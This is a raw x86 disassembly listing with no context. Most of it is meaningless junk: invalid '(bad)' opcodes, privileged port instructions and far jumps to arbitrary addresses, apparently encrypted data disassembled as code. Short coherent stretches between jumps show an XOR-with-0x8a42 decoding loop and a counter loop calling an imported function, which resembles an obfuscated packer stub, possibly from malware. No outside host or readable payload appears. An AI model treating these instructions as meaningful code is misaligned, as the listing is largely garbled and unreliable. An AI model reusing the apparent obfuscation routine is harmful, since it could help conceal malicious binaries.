  403b75:	xor    cl,BYTE PTR [edi]
  403b77:	adc    ebx,DWORD PTR [ebx]
  403b79:	in     eax,0xfa
  403b7b:	std    
  403b7c:	add    edi,DWORD PTR [edx-0x452f38c1]
  403b82:	sub    BYTE PTR [edi-0x12],bh
  403b85:	push   es
  403b86:	jl     0x403c04
  403b88:	push   esp
  403b89:	jl     0x403c07
  403b8b:	jl     0x403b0d
  403b8d:	pop    ecx
  403b8e:	js     0x403b20
  403b90:	es add eax,0x5f79b295
  403b96:	pop    ecx
  403b97:	call   0x8f8b:0x9284a42e
  403b9e:	stos   DWORD PTR es:[edi],eax
  403b9f:	push   ecx
  403ba0:	mov    ecx,0xf4c58e88
  403ba5:	in     al,0x62
  403ba7:	(bad)  
  403ba8:	mov    eax,ds:0x418080a5
  403bad:	xchg   edx,eax
  403bae:	sbb    BYTE PTR [esi-0x3e55bb27],cl
  403bb4:	pop    ebx
  403bb5:	dec    eax
  403bb6:	sub    DWORD PTR [esi-0x6f3d63f5],ebx
  403bbc:	stos   DWORD PTR es:[edi],eax
  403bbd:	in     al,dx
  403bbe:	icebp  
  403bbf:	and    dl,BYTE PTR [edi]
  403bc1:	mov    al,0x59
  403bc3:	(bad)  
  403bc5:	and    al,0x84
  403bc7:	pusha  
  403bc8:	fs mov esi,0x3dbdd0f8
  403bce:	inc    edx
  403bcf:	push   es
  403bd0:	mov    edx,0x74c91a41
  403bd5:	add    eax,0x380f5ced
  403bda:	mov    ebx,0xdc9b4b83
  403bdf:	ins    BYTE PTR es:[edi],dx
  403be0:	out    dx,al
  403be1:	imul   ecx,DWORD PTR [ebp-0xf],0xdb48c2f7
  403be8:	out    0xbf,al
  403bea:	mov    ds:0xece6e30b,al
  403bef:	jno    0x403c3b
  403bf1:	mov    ebx,DWORD PTR [ecx-0x6c]
  403bf4:	adc    esi,0x8ddbd2e0
  403bfa:	outs   dx,DWORD PTR ds:[esi]
  403bfb:	sbb    ebp,DWORD PTR [esi-0x66]
  403bfe:	dec    esi
  403bff:	clc    
  403c00:	in     eax,0xee
  403c02:	fnstsw WORD PTR [ebp+0x52c862]
  403c08:	jecxz  0x403b8e
  403c0a:	lock pop ecx
  403c0c:	(bad)  
  403c0d:	pop    ds
  403c0e:	pop    edi
  403c0f:	dec    edi
  403c10:	push   edx
  403c11:	jmp    0xb2e9:0x4f760292
  403c18:	dec    eax
  403c19:	jg     0x403be0
  403c1b:	inc    esp
  403c1c:	mov    eax,0x7040f2e9
  403c21:	adc    eax,0x96fdb270
  403c26:	xchg   esi,eax
  403c27:	cmc    
  403c28:	ins    BYTE PTR es:[edi],dx
  403c29:	in     al,dx
  403c2a:	cli    
  403c2b:	mov    edx,0xf0ad905b
  403c30:	(bad)  
  403c31:	push   ebp
  403c32:	fisttp QWORD PTR [eax]
  403c34:	pop    ds
  403c35:	inc    ecx
  403c36:	jp     0x403bf1
  403c38:	(bad)  
  403c39:	stc    
  403c3a:	and    edx,DWORD PTR [edi-0x77]
  403c3d:	pop    ebp
  403c3e:	inc    edx
  403c3f:	(bad)  
  403c40:	and    bh,BYTE PTR [ecx]
  403c42:	push   esi
  403c43:	jo     0x403c18
  403c45:	test   al,al
  403c47:	cmp    eax,0x121fc02
  403c4c:	mov    bh,BYTE PTR [esi+0x42]
  403c4f:	mov    WORD PTR ds:0xbdc97dee,fs
  403c55:	(bad)  
  403c56:	jno    0x403c36
  403c58:	jae    0x403c6e
  403c5a:	jg     0x403bf4
  403c5c:	(bad)  
  403c5d:	aad    0x37
  403c5f:	xchg   esp,eax
  403c60:	jecxz  0x403c3e
  403c62:	fdivr  DWORD PTR [edx]
  403c64:	sub    DWORD PTR [ebp+eiz*1+0x55],0xffffffe8
  403c69:	and    BYTE PTR [ebp+ecx*8-0x79],ch
  403c6d:	mov    ecx,0x609d95e4
  403c72:	and    al,0xfd
  403c74:	mov    DWORD PTR [ebp-0x10],0xf89c8534
  403c7b:	mov    eax,ds:0x42c8be
  403c80:	mov    ecx,DWORD PTR ds:0x4278bb
  403c86:	sub    eax,ecx
  403c88:	sub    eax,DWORD PTR [eax+ecx*1]
  403c8b:	mov    eax,DWORD PTR [ebp-0x8]
  403c8e:	mov    ecx,0x7510857
  403c93:	push   esi
  403c94:	xor    eax,ecx
  403c96:	movzx  esi,BYTE PTR ds:0x427d03
  403c9d:	sub    DWORD PTR ds:0x4292d9,esi
  403ca3:	jmp    0x403da8
  403ca8:	cld    
  403ca9:	pop    eax
  403caa:	cwde   
  403cab:	daa    
  403cac:	pop    eax
  403cad:	out    0x93,eax
  403caf:	jnp    0x403d22
  403cb1:	or     esp,0x29
  403cb4:	iret   
  403cb5:	sub    eax,DWORD PTR [esi+0x7c19c660]
  403cbb:	jl     0x403d11
  403cbd:	jl     0x403d3b
  403cbf:	jl     0x403cdf
  403cc1:	inc    edi
  403cc2:	mov    eax,0x793ee2b5
  403cc7:	dec    ebx
  403cc8:	adc    bh,BYTE PTR [ebp-0x49]
  403ccb:	or     BYTE PTR [ebx-0xe],al
  403cce:	out    0xf,al
  403cd0:	out    dx,al
  403cd1:	gs sbb eax,0x9b3b768e
  403cd7:	sub    BYTE PTR [ebx-0x7986e53e],ah
  403cdd:	jae    0x403d0e
  403cdf:	push   ds
  403ce0:	mov    edi,DWORD PTR [ecx+0x2ce53715]
  403ce6:	hlt    
  403ce7:	scas   al,BYTE PTR es:[edi]
  403ce8:	push   edi
  403ce9:	pop    ss
  403cea:	push   es
  403ceb:	xor    edi,DWORD PTR [ebp+eax*1+0x78b9d35]
  403cf2:	test   al,0x13
  403cf4:	fdivr  DWORD PTR [edi-0x3ee9e11b]
  403cfa:	push   cs
  403cfb:	cwde   
  403cfc:	scas   al,BYTE PTR es:[edi]
  403cfd:	retf   
  403cfe:	mov    ds:0x67eb32e7,al
  403d03:	jne    0x403c8d
  403d05:	punpckldq mm2,mm7
  403d08:	mov    edi,0x9d8e476a
  403d0d:	inc    esi
  403d0e:	push   0x2
  403d10:	inc    eax
  403d11:	retf   0xe374
  403d14:	(bad)  
  403d15:	enter  0x2e97,0x1c
  403d19:	xchg   ebx,eax
  403d1a:	dec    esi
  403d1b:	fyl2xp1 
  403d1d:	inc    esp
  403d1e:	jb     0x403cad
  403d20:	out    0xd9,eax
  403d22:	xlat   BYTE PTR ds:[ebx]
  403d23:	push   ecx
  403d24:	cmp    bl,BYTE PTR [eax+0x0]
  403d27:	fs popf 
  403d29:	cwde   
  403d2a:	xor    al,0x7c
  403d2c:	jno    0x403cef
  403d2e:	cdq    
  403d2f:	div    DWORD PTR [edi+0x58786e15]
  403d35:	xchg   esi,eax
  403d36:	mov    edi,es
  403d38:	ins    DWORD PTR es:[edi],dx
  403d39:	mov    ebx,cs
  403d3b:	repz sti 
  403d3d:	neg    esi
  403d3f:	pop    ebx
  403d40:	pusha  
  403d41:	dec    ebp
  403d42:	or     al,0x3b
  403d44:	fldenv ds:0x2dbf4277
  403d4a:	fwait
  403d4b:	jl     0x403d17
  403d4d:	leave  
  403d4e:	pop    es
  403d4f:	sbb    bl,BYTE PTR [edi-0x747e8a8d]
  403d55:	jae    0x403dc0
  403d57:	iret   
  403d58:	aas    
  403d59:	test   BYTE PTR [ecx+ebx*2-0x1b682468],ch
  403d60:	and    dh,ah
  403d62:	in     eax,dx
  403d63:	adc    eax,DWORD PTR [edx+0x75da0c25]
  403d69:	add    eax,0x5528a175
  403d6e:	ficom  DWORD PTR [ebx+0x5e]
  403d71:	mov    ds:0x7141fae4,al
  403d76:	push   edx
  403d77:	(bad)  
  403d78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d79:	pop    esp
  403d7a:	jne    0x403db7
  403d7c:	(bad)  
  403d7d:	pop    ecx
  403d7e:	adc    WORD PTR [esi-0x6824775b],0xff85
  403d86:	ss adc cl,BYTE PTR es:[eax-0x298eb7e2]
  403d8e:	stos   DWORD PTR es:[edi],eax
  403d8f:	sub    al,0x5d
  403d91:	lahf   
  403d92:	in     eax,dx
  403d93:	sub    ebx,ebp
  403d95:	test   BYTE PTR [edx],dh
  403d97:	in     eax,0x69
  403d99:	cmp    ch,BYTE PTR [esi-0x31]
  403d9c:	dec    eax
  403d9d:	stos   DWORD PTR es:[edi],eax
  403d9e:	cwde   
  403d9f:	lahf   
  403da0:	pop    esi
  403da1:	dec    ebp
  403da2:	mov    esi,0xf9c01b5
  403da7:	mov    dl,0xbe
  403da9:	sahf   
  403daa:	jb     0x403dde
  403dac:	add    BYTE PTR [ecx+0x4275981d],al
  403db2:	add    BYTE PTR [esi+0x73],cl
  403db5:	add    BYTE PTR [eax],al
  403db7:	add    eax,esi
  403db9:	mov    DWORD PTR ds:0x4292d9,0x3d2c
  403dc3:	jmp    0x403ee9
  403dc8:	mov    DWORD PTR ds:0x4292d5,0x6a19
  403dd2:	mov    dl,BYTE PTR [ebp-0x1]
  403dd5:	jmp    0x403eda
  403dda:	sub    DWORD PTR [edi+edi*4+0x69d96176],eax
  403de1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403de2:	sub    al,0x65
  403de4:	sbb    BYTE PTR [esi],ch
  403de6:	sbb    BYTE PTR [esi+ebp*8],bh
  403de9:	inc    eax
  403dea:	sbb    BYTE PTR ds:[esp+edi*2+0x54],bh
  403def:	jl     0x403e6d
  403df1:	jl     0x403d85
  403df3:	mov    edx,DWORD PTR [ecx-0x3f]
  403df6:	and    al,0x63
  403df8:	cdq    
  403df9:	jo     0xcd0d20d8
  403dff:	mov    esp,0x7e8bba28
  403e04:	neg    ecx
  403e06:	add    BYTE PTR [eax+0x29],0x9e
  403e0a:	shl    DWORD PTR [eax+0x6456d848],cl
  403e10:	neg    al
  403e12:	aam    0x2a
  403e14:	fsub   QWORD PTR [esi]
  403e16:	ins    BYTE PTR es:[edi],dx
  403e17:	es jle 0x403d9a
  403e1a:	mov    BYTE PTR [eax+ebp*1],cl
  403e1d:	and    ecx,esp
  403e1f:	xchg   edx,eax
  403e20:	jbe    0x403e6c
  403e22:	ins    DWORD PTR es:[edi],dx
  403e23:	into   
  403e24:	sbb    eax,0xf8c44782
  403e29:	jae    0x403e8c
  403e2b:	(bad)  
  403e2c:	iret   
  403e2d:	ds pop esp
  403e2f:	fld    TBYTE PTR ds:0x3666e499
  403e35:	gs push edx
  403e37:	jg     0x403dc7
  403e39:	xor    dh,BYTE PTR [ebx]
  403e3b:	jb     0x403de9
  403e3d:	sub    eax,0x1412e015
  403e42:	xchg   DWORD PTR [ebx+ecx*8],esp
  403e45:	cmp    al,0xd5
  403e47:	shl    DWORD PTR [ebp+ecx*8+0x1c],1
  403e4b:	fwait
  403e4c:	jbe    0x403e60
  403e4e:	pop    ss
  403e4f:	sub    esi,ecx
  403e51:	ja     0x403e34
  403e53:	xchg   esp,eax
  403e54:	push   ebp
  403e55:	mov    edi,0x63b817af
  403e5a:	xor    ch,BYTE PTR [esi+0x53005860]
  403e60:	in     eax,dx
  403e61:	mov    BYTE PTR [edi+0x40cbc7e6],al
  403e67:	mov    al,ds:0xcaf6110e
  403e6c:	lds    esp,FWORD PTR ds:[ebx]
  403e6f:	mov    BYTE PTR [ebp+0x26],bl
  403e72:	cld    
  403e73:	push   0x4d
  403e75:	pop    ds
  403e76:	jmp    0x4552:0x927dbd0e
  403e7d:	div    BYTE PTR [ebx]
  403e7f:	mov    ch,0x94
  403e81:	jb     0x403ea1
  403e83:	retf   
  403e84:	clc    
  403e85:	mov    ah,0x2c
  403e87:	mov    edi,0x8fb028ec
  403e8c:	femms  
  403e8e:	ror    esp,1
  403e90:	push   esp
  403e91:	(bad)  
  403e92:	retf   
  403e93:	dec    ebx
  403e94:	aad    0xff
  403e96:	jae    0x403e41
  403e98:	dec    esi
  403e99:	test   BYTE PTR [ecx],dh
  403e9b:	cmp    eax,0xe398727a
  403ea0:	(bad)  
  403ea1:	in     al,0xc2
  403ea3:	inc    eax
  403ea4:	jnp    0x403ee0
  403ea6:	ss int3 
  403ea8:	push   esp
  403ea9:	in     al,0x55
  403eab:	cmp    BYTE PTR [esi+0x7e],ch
  403eae:	mov    dl,0xb2
  403eb0:	jae    0x403f05
  403eb2:	ret    
  403eb3:	inc    eax
  403eb4:	imul   eax,eax,0xbd5f561b
  403eba:	jg     0x403e72
  403ebc:	mov    ah,0xf4
  403ebe:	adc    al,BYTE PTR [edi+0x537fe659]
  403ec4:	add    al,0x3a
  403ec6:	fst    QWORD PTR [ecx+0x2a]
  403ec9:	gs (bad) 
  403ecb:	xor    bl,BYTE PTR [esi-0xe03d315]
  403ed1:	sbb    ah,BYTE PTR [edx-0x4c]
  403ed4:	jle    0x403e86
  403ed6:	(bad)  
  403ed7:	sti    
  403ed8:	dec    ecx
  403ed9:	imul   ecx,DWORD PTR [eax-0x3857faac],0x5
  403ee0:	cwde   
  403ee1:	jne    0x403f25
  403ee3:	add    BYTE PTR [edi],cl
  403ee5:	or     al,0x0
  403ee7:	add    BYTE PTR [eax-0x7d],al
  403eea:	clc    
  403eeb:	inc    eax
  403eec:	mov    DWORD PTR ds:0x4292cd,0x3a6f
  403ef6:	jb     0x403dc8
  403efc:	mov    edx,DWORD PTR ds:0x4292e9
  403f02:	mov    edx,DWORD PTR [edx]
  403f04:	xor    DWORD PTR ds:0x427d07,edx
  403f0a:	mov    edx,DWORD PTR [ebp-0x8]
  403f0d:	xor    eax,0x54c0
  403f12:	mov    eax,DWORD PTR [ebp-0xc]
  403f15:	xor    edx,ecx
  403f17:	adc    DWORD PTR ds:0x4275a8,0x4292d1
  403f21:	jmp    0x404026
  403f26:	push   cs
  403f27:	ds add al,0xd
  403f2a:	(bad)  
  403f2b:	fld    QWORD PTR ds:0x74fb2bdd
  403f31:	sub    DWORD PTR [ebp+ecx*2+0x1b16d3c8],ecx
  403f38:	jl     0x403fb6
  403f3a:	push   esp
  403f3b:	jl     0x403fb9
  403f3d:	jl     0x403f8a
  403f3f:	xchg   ecx,eax
  403f40:	ds stos BYTE PTR es:[edi],al
  403f42:	dec    edx
  403f43:	mov    eax,ds:0x4582daa0
  403f48:	push   ebx
  403f49:	jg     0x403f87
  403f4b:	adc    BYTE PTR [edx-0x80],bl
  403f4e:	call   0xabcd12f9
  403f53:	jmp    0x5073:0xae6e2c53
  403f5a:	enter  0xc469,0x4a
  403f5e:	rcl    esi,1
  403f60:	add    eax,0xa0ff0591
  403f65:	(bad)  
  403f66:	scas   eax,DWORD PTR es:[edi]
  403f67:	fiadd  DWORD PTR ss:[eax+ebx*8]
  403f6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f6c:	std    
  403f6d:	cmp    ch,ah
  403f6f:	or     BYTE PTR [eax+0x5a],0x54
  403f73:	jp     0x403f58
  403f75:	aas    
  403f76:	push   eax
  403f77:	(bad)
  403f7c:	cmc    
  403f7d:	jae    0x403fa9
  403f7f:	mov    ch,0x77
  403f81:	pop    ds
  403f82:	aam    0xd6
  403f84:	push   DWORD PTR [eax-0x1f]
  403f87:	mov    al,0x2b
  403f89:	cmp    dh,al
  403f8b:	jle    0x403fb7
  403f8d:	es (bad) 
  403f8f:	pop    eax
  403f90:	jb     0x403fe6
  403f92:	or     al,0x77
  403f94:	cwde   
  403f95:	retf   0xe82b
  403f98:	pop    ss
  403f99:	pop    eax
  403f9a:	stos   BYTE PTR es:[edi],al
  403f9b:	cld    
  403f9c:	arpl   WORD PTR [edx],bp
  403f9e:	add    ebx,DWORD PTR [ebx+eax*2+0x29]
  403fa2:	cld    
  403fa3:	outs   dx,BYTE PTR ds:[esi]
  403fa4:	enter  0x6f04,0x21
  403fa8:	push   0xf02aaabe
  403fad:	lahf   
  403fae:	popf   
  403faf:	mov    esi,0xe975a0eb
  403fb4:	ret    0xe790
  403fb7:	mov    bl,0x1f
  403fb9:	icebp  
  403fba:	push   es
  403fbb:	cmc    
  403fbc:	into   
  403fbd:	rcl    BYTE PTR [ebx+0x70],cl
  403fc0:	or     eax,eax
  403fc2:	adc    al,0x98
  403fc4:	inc    ebp
  403fc5:	bound  edi,QWORD PTR [ecx+0x38]
  403fc8:	jmp    0x325fb96b
  403fcd:	mov    edx,DWORD PTR ds:0xe0f7244f
  403fd3:	test   al,0x8a
  403fd5:	add    al,BYTE PTR ss:[ebp-0x7]
  403fd9:	ins    DWORD PTR es:[edi],dx
  403fda:	test   eax,0xf0720a13
  403fdf:	adc    eax,DWORD PTR [edi]
  403fe1:	inc    ebx
  403fe2:	lock nop
  403fe4:	pop    ecx
  403fe5:	mov    edx,0xecc25139
  403fea:	(bad)  
  403feb:	dec    edi
  403fec:	pop    es
  403fed:	(bad)  [edi-0x5c]
  403ff0:	mov    dh,0xac
  403ff2:	leave  
  403ff3:	xor    ebx,DWORD PTR [ebp-0x68]
  403ff6:	hlt    
  403ff7:	pop    es
  403ff8:	dec    edx
  403ff9:	xor    BYTE PTR [edx+0x54],ah
  403ffc:	mov    ch,0xec
  403ffe:	out    0x15,eax
  404000:	and    ch,BYTE PTR [ecx]
  404002:	stc    
  404003:	sti    
  404004:	cmp    eax,0x9db66435
  404009:	(bad)  
  40400b:	sub    al,0x40
  40400d:	lea    eax,[edi]
  40400f:	jp     0x404038
  404011:	stc    
  404012:	xchg   esp,eax
  404013:	ret    0xb9d6
  404016:	or     ebx,DWORD PTR [edx]
  404018:	repz aaa 
  40401a:	add    BYTE PTR [edx+0x50],bl
  40401d:	lock pop ebp
  40401f:	push   es
  404020:	dec    eax
  404021:	jae    0x40409b
  404023:	lods   al,BYTE PTR ds:[esi]
  404024:	cli    
  404025:	pushf  
  404026:	add    edx,esi
  404028:	mov    DWORD PTR ds:0x42c88a,0x7aaf
  404032:	cmp    edx,eax
  404034:	mov    DWORD PTR ds:0x4292c1,0x7e3a
  40403e:	je     0x4043e5
  404044:	and    DWORD PTR ds:0x42c88a,0x0
  40404e:	mov    eax,ds:0x42c88a
  404053:	inc    eax
  404054:	mov    ds:0x42c88a,eax
  404059:	cmp    DWORD PTR ds:0x42c88a,0xa
  404060:	jne    0x404071
  404066:	push   0x1f92
  40406b:	call   DWORD PTR ds:0x427c47
  404071:	cmp    DWORD PTR ds:0x42c88a,0x9
  404078:	jne    0x404089
  40407e:	mov    eax,ds:0x42c88a
  404083:	inc    eax
  404084:	mov    ds:0x42c88a,eax
  404089:	cmp    DWORD PTR ds:0x42c88a,0x1a
  404090:	jb     0x40404e
  404096:	push   ebx
  404097:	jmp    0x40419c
  40409c:	mov    fs,WORD PTR [edi]
  40409e:	mov    al,0x47
  4040a0:	ins    DWORD PTR es:[edi],dx
  4040a1:	jnp    0x404040
  4040a3:	stc    
  4040a4:	sbb    al,ch
  4040a6:	(bad)  
  4040a7:	nop
  4040a8:	mov    eax,0xe0755a7
  4040ad:	sbb    bh,BYTE PTR [esp+edi*2+0x54]
  4040b1:	jl     0x40412f
  4040b3:	jl     0x404058
  4040b5:	push   edi
  4040b6:	fist   DWORD PTR [ebp-0x1d252738]
  4040bc:	nop
  4040bd:	xchg   ebp,eax
  4040be:	mov    ah,0x2d
  4040c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040c1:	jno    0x4040f9
  4040c3:	aaa    
  4040c4:	cs jnp 0x404065
  4040c7:	xchg   ebp,eax
  4040c8:	sbb    BYTE PTR [eax-0x3f4e33bd],ch
  4040ce:	jmp    0x173f:0x836f4f8c
  4040d5:	mov    esp,0x581e175e
  4040da:	push   cs
  4040db:	pop    ss
  4040dc:	jmp    0x404130
  4040de:	xchg   BYTE PTR [ecx+0x3a],dl
  4040e1:	adc    BYTE PTR [edi+ebx*1+0x7],ah
  4040e5:	nop
  4040e6:	out    0x24,eax
  4040e8:	sub    DWORD PTR [ebx],esp
  4040ea:	into   
  4040eb:	fcmovbe st,st(1)
  4040ed:	test   cl,ah
  4040ef:	mov    dl,cl
  4040f1:	jns    0x4040ac
  4040f3:	stos   BYTE PTR es:[edi],al
  4040f4:	aas    
  4040f5:	mov    ecx,DWORD PTR [edi-0x3ae0b46b]
  4040fb:	data16 mov ch,0xb3
  4040fe:	jo     0x40414c
  404100:	lds    esp,FWORD PTR [ebp+0x223db8b1]
  404106:	popf   
  404107:	push   eax
  404108:	stc    
  404109:	jmp    0xa3c0:0x3cf6d938
  404110:	imul   ebx,ebx,0x6
  404113:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404114:	and    esi,DWORD PTR [eax-0x64]
  404117:	xor    BYTE PTR [eax-0x18583c17],dh
  40411d:	add    esi,ebx
  40411f:	aam    0x57
  404121:	cwde   
  404122:	call   0xeed8f67a
  404127:	dec    ecx
  404128:	std    
  404129:	popa   
  40412a:	push   ecx
  40412b:	call   0xba0c12c5
  404130:	jmp    0x40413c
  404132:	add    WORD PTR [eax],0x1
  404136:	nop
  404137:	push   esi
  404138:	mov    dl,0x70
  40413a:	mov    ch,0x53
  40413c:	sub    eax,DWORD PTR [esi+0x1f228370]
  404142:	sub    eax,0x7bdfa188
  404147:	adc    DWORD PTR [ecx-0x2a40dac5],esp
  40414d:	and    DWORD PTR [edx],ebp
  40414f:	mov    ebx,0x1727ab6e
  404154:	inc    ebx
  404155:	push   cs
  404156:	imul   ecx,DWORD PTR [esi+0x5],0xffffffc7
  40415a:	inc    ebp
  40415b:	or     al,0x6f
  40415d:	adc    eax,0xaa6a48fa
  404162:	adc    ebp,0xffffff9d
  404165:	or     eax,0x5674b7b
  40416a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40416b:	jle    0x4041ad
  40416d:	push   eax
  40416e:	inc    edi
  40416f:	test   al,0xa2
  404171:	push   ds
  404172:	mov    esi,0x448b3029
  404177:	ret    0xb984
  40417a:	xor    BYTE PTR [edi+ebx*8+0x587ef065],dl
  404181:	ds in  eax,0x89
  404184:	or     dl,BYTE PTR [eax+0x679912ef]
  40418a:	aas    
  40418b:	cdq    
  40418c:	inc    ecx
  40418d:	sar    BYTE PTR [ebx],0x69
  404190:	into   
  404191:	jns    0x404182
  404193:	fadd   st,st(3)
  404195:	and    BYTE PTR [esi+0x1f4ecd75],dl
  40419b:	xchg   DWORD PTR [edi-0x75],edx
  40419e:	jge    0x4041a8
  4041a0:	mov    eax,0x8a42
  4041a5:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4041aa:	jmp    0x4042af
  4041af:	sbb    eax,0x673c6c22
  4041b4:	mov    dl,0xbd
  4041b6:	std    
  4041b7:	adc    ah,BYTE PTR [ebx+0x4773a08]
  4041bd:	mov    esi,0x7c1a663d
  4041c2:	jl     0x404218
  4041c4:	jl     0x404242
  4041c6:	jl     0x404222
  4041c8:	mov    ds:0x363ef580,eax
  4041cd:	leave  
  4041ce:	inc    esi
  4041cf:	fisttp WORD PTR [ebx-0x21fc6dc0]
  4041d5:	test   DWORD PTR [ebp+ecx*2+0x33],ebx
  4041d9:	(bad)  
  4041db:	ret    
  4041dc:	sbb    edi,DWORD PTR [edx-0x3112e38a]
  4041e2:	fwait
  4041e3:	mov    ?,edx
  4041e5:	out    dx,eax
  4041e6:	sti    
  4041e7:	iret   
  4041e8:	push   es
  4041e9:	in     al,dx
  4041ea:	push   0x458f294a
  4041ef:	add    ah,al
  4041f1:	pop    esi
  4041f2:	cmp    ebp,DWORD PTR [eax]
  4041f4:	inc    ebx
  4041f5:	mov    bl,0x5
  4041f7:	mov    ecx,0x3dacf26
  4041fc:	or     ch,cl
  4041fe:	and    cl,cl
  404200:	fmul   QWORD PTR [ecx-0x3d]
  404203:	inc    ebp
  404204:	int3   
  404205:	pop    ecx
  404206:	test   BYTE PTR [ebx-0x5c],bl
  404209:	push   cs
  40420a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40420b:	inc    esp
  40420c:	sbb    al,0x4f
  40420e:	jbe    0x404263
  404210:	sub    eax,esp
  404212:	addr16 aas 
  404214:	or     al,0x75
  404216:	push   cs
  404217:	mov    edi,0x92db1b4f
  40421c:	mov    bl,0xfc
  40421e:	repnz and al,0x70
  404221:	sub    DWORD PTR [edi+0x740b0f1b],esp
  404227:	hlt    
  404228:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404229:	adc    eax,0x305f34a4
  40422e:	xor    DWORD PTR ds:0x66a01bf4,ecx
  404234:	cmp    eax,0x3b240b2b
  404239:	scas   al,BYTE PTR es:[edi]
  40423a:	pop    esp
  40423b:	shl    ch,cl
  40423d:	ds rcl bh,0x17
  404241:	scas   al,BYTE PTR es:[edi]
  404242:	and    BYTE PTR [ebx-0x2bd60b68],ah
  404248:	in     eax,dx
  404249:	cmc    
  40424a:	or     BYTE PTR [edi-0x29],ah
  40424d:	ss push eax
  40424f:	sbb    eax,0xd29bccfc
  404254:	inc    ebx
  404255:	dec    ecx
  404256:	cmp    ah,bh
  404258:	stos   BYTE PTR es:[edi],al
  404259:	stos   BYTE PTR es:[edi],al
  40425a:	jl     0x4042ae
  40425c:	mov    ds:0x9a3ede34,eax
  404261:	mov    ebp,0xc89dfcb3
  404266:	pop    es
  404267:	call   0xc79521f4
  40426c:	ins    BYTE PTR es:[edi],dx
  40426d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40426e:	inc    edx
  40426f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404270:	bnd jno 0x40420b
  404273:	retf   0x1124
  404276:	or     ch,BYTE PTR [eax-0x7cc59698]
  40427c:	mov    esi,0x809fec8
  404281:	fild   WORD PTR [ebx+0x15]
  404284:	and    dl,ch
  404286:	pop    es
  404287:	dec    esi
  404288:	inc    esi
  404289:	jle    0x404295
  40428b:	scas   eax,DWORD PTR es:[edi]
  40428c:	add    eax,ebp
  40428e:	inc    ecx
  40428f:	mov    edx,0xdc51bafd
  404294:	xlat   BYTE PTR ds:[ebx]
  404295:	dec    esi
  404296:	(bad)  
  404297:	pop    ecx
  404298:	jb     0x404228
  40429a:	test   edx,esi
  40429c:	mov    bh,BYTE PTR [edx-0x3bf2e911]
  4042a2:	mov    al,0x53
  4042a4:	mov    ecx,0x1d5cc5b6
  4042a9:	idiv   BYTE PTR [eax-0x4a]
  4042ac:	(bad)  
  4042ad:	and    al,0xc1
  4042af:	mov    edi,0x3b08
  4042b4:	add    ax,di
  4042b7:	movzx  eax,ax
  4042ba:	mov    DWORD PTR [ebp-0x14],eax
  4042bd:	mov    eax,DWORD PTR [ebp+0x8]
  4042c0:	movzx  eax,WORD PTR [eax+edx*4]
  4042c4:	xor    eax,0x8a42
  4042c9:	add    eax,edi
  4042cb:	mov    edi,DWORD PTR [ebp-0x14]
  4042ce:	mov    BYTE PTR [ebp+edi*1-0x58],al
  4042d2:	mov    eax,DWORD PTR [ebp-0xc]
  4042d5:	inc    edx
  4042d6:	cmp    edx,eax
  4042d8:	jmp    0x4043dd
  4042dd:	daa    
  4042de:	mov    edi,0x79794fe9
  4042e3:	mov    ecx,0xc966f157
  4042e8:	dec    esi
  4042e9:	jle    0x40426f
  4042eb:	lea    ebp,[esi+ebx*2+0x1d]
  4042ef:	jl     0x40436d
  4042f1:	push   esp
  4042f2:	jl     0x404370
  4042f4:	jl     0x4042a5
  4042f6:	jo     0x4042d5
  4042f8:	dec    eax
  4042f9:	mov    eax,0x82efdc32
  4042fe:	fdiv   QWORD PTR [ebp-0x6d]
  404301:	or     bh,BYTE PTR [eax+ecx*1+0x4f72035d]
  404308:	mov    edi,0x3c34418a
  40430d:	and    DWORD PTR [eax-0x230b4a70],ecx
  404313:	xchg   BYTE PTR [eax+0x4019f56b],bh
  404319:	ss or  al,0x50
  40431c:	out    0x2e,eax
  40431e:	repz imul ecx,DWORD PTR [eax],0xe3094ae9
  404325:	sbb    BYTE PTR [eax+0x58c0aaef],bl
  40432b:	shr    DWORD PTR [edi],1
  40432d:	lea    edi,[esi]
  40432f:	js     0x4042d3
  404331:	sub    bh,bh
  404333:	and    ah,BYTE PTR [eax+0x5b]
  404336:	and    BYTE PTR [esi+0x7b],bh
  404339:	xchg   esi,eax
  40433a:	retf   
  40433b:	retf   
  40433c:	int3   
  40433d:	retf   0x6b05
  404340:	or     DWORD PTR [eax+0x79],ebp
  404343:	fdiv   QWORD PTR [ebx+0x24d1f91a]
  404349:	arpl   WORD PTR [ecx-0x36],dx
  40434c:	jmp    0x40431a
  40434e:	out    dx,al
  40434f:	jle    0x4042ec
  404351:	fwait
  404352:	ret    0x33a0
  404355:	aas    
  404356:	xchg   ebx,eax
  404357:	pop    es
  404358:	pop    eax
  404359:	fidiv  WORD PTR [edi-0x48ed51b5]
  40435f:	or     esi,DWORD PTR [ecx+0x17162d48]
  404365:	repnz mov edi,0xf03a4aba
  40436b:	mov    esp,0x25d00187
  404370:	hlt    
  404371:	and    al,0x79
  404373:	stos   BYTE PTR es:[edi],al
  404374:	icebp  
  404375:	(bad)  
  404376:	jle    0x40434b
  404378:	ror    esp,0xbf
  40437b:	clc    
  40437c:	add    dl,bh
  40437e:	ds sti 
  404380:	dec    esp
  404381:	pop    esp
  404382:	or     eax,0xd83594cd
  404387:	or     eax,0x3a33cde
  40438c:	in     al,dx
  40438d:	ds mov bl,cl
  404390:	call   0xf54c:0xf1acb903
  404397:	shr    DWORD PTR [edx-0x6cf84a04],0xc7
  40439e:	xchg   esi,eax
  40439f:	(bad)  
  4043a0:	xlat   BYTE PTR ds:[ebx]
  4043a1:	or     al,0xbf
  4043a3:	jo     0x404362
  4043a5:	ds ja  0x7f268a8b
  4043ac:	hlt    
  4043ad:	dec    ecx
  4043ae:	cs popf 
  4043b0:	mov    bh,0x60
  4043b2:	shl    DWORD PTR [edi],cl
  4043b4:	stos   DWORD PTR es:[edi],eax
  4043b5:	lock mov dh,0x2a
  4043b8:	aam    0xe8
  4043ba:	cwde   
  4043bb:	aad    0xc5
  4043bd:	call   0x9011d7b2
